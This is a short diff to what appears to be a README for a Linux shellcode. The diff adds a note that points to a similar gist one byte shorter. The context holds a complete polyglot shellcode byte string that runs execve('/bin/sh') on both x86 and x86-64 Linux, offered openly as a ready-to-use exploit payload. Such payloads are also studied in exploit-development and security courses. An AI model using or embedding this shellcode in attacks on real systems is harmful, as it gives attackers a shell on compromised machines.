@@ -1,6 +1,8 @@
 This shellcode executes `execve("/bin/sh", {"/bin/sh", 0}, 0)`, on both x86 and
 x86-64 linux.
 
+Note: shortly after writing this, I came across an incredibly similar shellcode,
+which is a byte shorter: https://gist.github.com/resilar/8771d94f8774c77f91cea99bf1a66ec8
 
 ```c
 "\x48\x31\xc0\x50\x50\x5a\xeb\x12\x5f\x57\x54\x40\x75\x05\xb0\x3b\x5e\x0f\x05\xb0\x0b\x89\xfb\x59\xcd\x80\xe8\xe9\xff\xff\xff/bin/sh"
